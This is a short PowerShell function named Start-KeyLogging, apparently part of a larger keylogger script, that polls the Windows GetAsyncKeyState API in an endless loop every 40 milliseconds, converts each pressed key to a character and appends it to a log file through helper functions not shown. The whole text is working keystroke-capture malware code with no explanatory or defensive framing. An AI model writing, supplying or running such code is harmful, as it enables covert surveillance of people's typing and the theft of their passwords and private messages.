function Start-KeyLogging {
    param ($API, $path)

    while ($true) {
        Start-Sleep -Milliseconds 40
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)
            if ($state -eq -32767) {
                $null = [console]::CapsLock
                $char = Convert-KeyToChar -ascii $ascii -API $API
                Write-KeyToLog -char $char -path $path
            }
        }
    }
}
